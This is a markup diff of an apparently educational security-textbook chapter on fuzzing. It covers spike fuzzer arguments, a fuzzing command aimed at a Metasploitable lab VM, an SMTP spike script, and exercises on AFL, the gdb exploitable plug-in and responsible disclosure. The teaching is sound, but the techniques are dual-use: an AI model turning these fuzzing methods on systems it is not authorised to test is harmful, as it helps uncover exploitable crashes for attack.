-		<p class="indent">The spike fuzzer has a predefined array of string mutations, and the <span class="literal"><em>[string index]</em></span> value specifies which of these to use first. For example, a value of 0 would start with the first string mutation, whereas a value of 4 would start with the fifth mutation. The <span class="literal"><em>[variable index]</em></span> and <span class="literal"><em>[string index</em></span><em>]</em> values are useful because they allow you to resume fuzzing at a specific point in the process if it terminates for any reason.</p>
+		<p class="indent">The <code><em>[variable index]</em></code> specifies the starting location in the script. For example, a variable index value of 0 would start fuzzing with the first variable in the script, whereas a value of 3 would leave the first three values unmutated and begin by mutating the fourth variable in script.</p>
+		<p class="indent">The spike fuzzer has a predefined array of string mutations, and the <code><em>[string index]</em></code> value specifies which of these to use first. For example, a value of 0 would start with the first string mutation, whereas a value of 4 would start with the fifth mutation. The <code><em>[variable index]</em></code> and <code><em>[string index</em></code><em>]</em> values are useful because they allow you to resume fuzzing at a specific point in the process if it terminates for any reason.</p>
 		<p class="indent">The complete command might look like this:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">generic_web_server_fuzz <span class="codeitalic">&lt;Metasploitable IP address&gt;</span> 25 /usr/share</span><br/>
+		<pre>kali@kali:~$ <span class="codestrong1">generic_web_server_fuzz <span class="codeitalic">&lt;Metasploitable IP address&gt;</span> 25 /usr/share</span><br/>
      
 			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">/spike/audits/SMTP/smtp1.spk 0 0</span><br/><br/>Target is 192.168.1.101<br/>Total Number of Strings is 681<br/>Fuzzing Variable 1:1<br/>Variablesize= 5004<br/>Request:<br/>HELO /.:/AAAAAAAAAAA<br/>
-...</p>
-		<p class="indent"><span epub:type="pagebreak" id="page_184"/>To better understand the output, let’s look at the <em>smtp1.spk</em> script. This <span class="literal">spike</span> script describes the SMTP protocol and consists of a collection of commands:</p>
-		<p class="programs">   s_string_variable("HELO");<br/>
+...</pre>
+		<p class="indent"><span epub:type="pagebreak" id="page_184"/>To better understand the output, let’s look at the <em>smtp1.spk</em> script. This <code>spike</code> script describes the SMTP protocol and consists of a collection of commands:</p>
+		<pre>   s_string_variable("HELO");<br/>
    s_string(" ");<br/>
    s_string_variable("localhost");<br/>
    s_string("\r\n");<br/>
    //endblock<br/><span class="ent">➊</span> s_string("MAIL-FROM");<br/>
-   s_string(":");<br/><span class="ent">➋</span> s_string_variable("bob")</p>
-		<p class="indent">The <span class="literal">s_string()</span> command tells the fuzzer to send a string corresponding to part of an SMTP message. The fuzzer sends the <span class="literal">MAIL-FROM</span> command associated with the SMTP protocol <span class="ent">➊</span>. The <span class="literal">s_string_variable()</span> command defines the string to mutate, which is <span class="literal">"bob"</span> in this case, and sends it <span class="ent">➋</span>. For example, the fuzzer might send <span class="literal">"boo</span>. The next time it mutates <span class="literal">bob</span> it might send <span class="literal">bAAAAAA</span>.</p>
-		<p class="indent">The <span class="literal">spike</span> script also supports other commands, such as <span class="literal">s_readline</span>, which displays a string representation of the response, and <span class="literal">printf()</span>, which writes to the local terminal (and is great for debugging). The <span class="literal">spike_send()</span> command flushes the buffer and sends all of its contents.</p>
-		<p class="indent">Try writing your own <span class="literal">spike</span> script for a different network protocol. If you find it useful, add it to the official <span class="literal">spike</span> Git repository at <em><a href="https://github.com/guilhermeferreira/spikepp.git">https://github.com/guilhermeferreira/spikepp.git</a></em>.</p>
+   s_string(":");<br/><span class="ent">➋</span> s_string_variable("bob")</pre>
+		<p class="indent">The <code>s_string()</code> command tells the fuzzer to send a string corresponding to part of an SMTP message. The fuzzer sends the <code>MAIL-FROM</code> command associated with the SMTP protocol <span class="ent">➊</span>. The <code>s_string_variable()</code> command defines the string to mutate, which is <code>"bob"</code> in this case, and sends it <span class="ent">➋</span>. For example, the fuzzer might send <code>"boo</code>. The next time it mutates <code>bob</code> it might send <code>bAAAAAA</code>.</p>
+		<p class="indent">The <code>spike</code> script also supports other commands, such as <code>s_readline</code>, which displays a string representation of the response, and <code>printf()</code>, which writes to the local terminal (and is great for debugging). The <code>spike_send()</code> command flushes the buffer and sends all of its contents.</p>
+		<p class="indent">Try writing your own <code>spike</code> script for a different network protocol. If you find it useful, add it to the official <code>spike</code> Git repository at <em><a href="https://github.com/guilhermeferreira/spikepp.git">https://github.com/guilhermeferreira/spikepp.git</a></em>.</p>
 		<h4 class="h4" id="ch09lev29"><strong><em>Fuzzing an Open Source Project</em></strong></h4>
 		<p class="noindent">Now let’s get some practice fuzzing a real program. In this exercise, try running the AFL-fuzzer you used in this chapter on your favorite open source project. Note that fuzzing open source programs is legal because it helps the developer community discover bugs that could potentially be exploited by attackers.</p>
 		<p class="indent">As you fuzz the program, remember to practice responsible disclosure. If you find a bug, send a secure email to the project’s creators. It’s also helpful if you explain how the bug could be exploited and include some sample exploitation code.</p>
-		<p class="indent">How can you quickly determine whether a bug is exploitable? The <span class="literal">gdb</span> exploitable plug-in allows you to determine if a bug that caused a crash might be malicious. You can download the plug-in from <em><a href="https://github.com/jfoote/exploitable">https://github.com/jfoote/exploitable</a></em>.</p>
+		<p class="indent">How can you quickly determine whether a bug is exploitable? The <code>gdb</code> exploitable plug-in allows you to determine if a bug that caused a crash might be malicious. You can download the plug-in from <em><a href="https://github.com/jfoote/exploitable">https://github.com/jfoote/exploitable</a></em>.</p>
 		<p class="indent">Fuzzing is a computationally intensive process, and we don’t recommend that you do this in your virtual machine. Instead, run the fuzzer on a remote server or on your local machine.</p>
 		<h4 class="h4" id="ch09lev30"><span epub:type="pagebreak" id="page_185"/><strong><em>Implement Your Own Concolic Execution Engine</em></strong></h4>
 		<p class="noindent">The physicist Richard Feynman once said, “What I cannot create, I do not understand.” The best way to develop a deep understanding of something is to implement it yourself. Try implementing your own concolic execution engine in Python. This exercise, given to MIT computer security students, has been made available to the general public here: <em><a href="https://css.csail.mit.edu/6.858/2018/labs/lab3.html">https://css.csail.mit.edu/6.858/2018/labs/lab3.html</a></em>.</p>
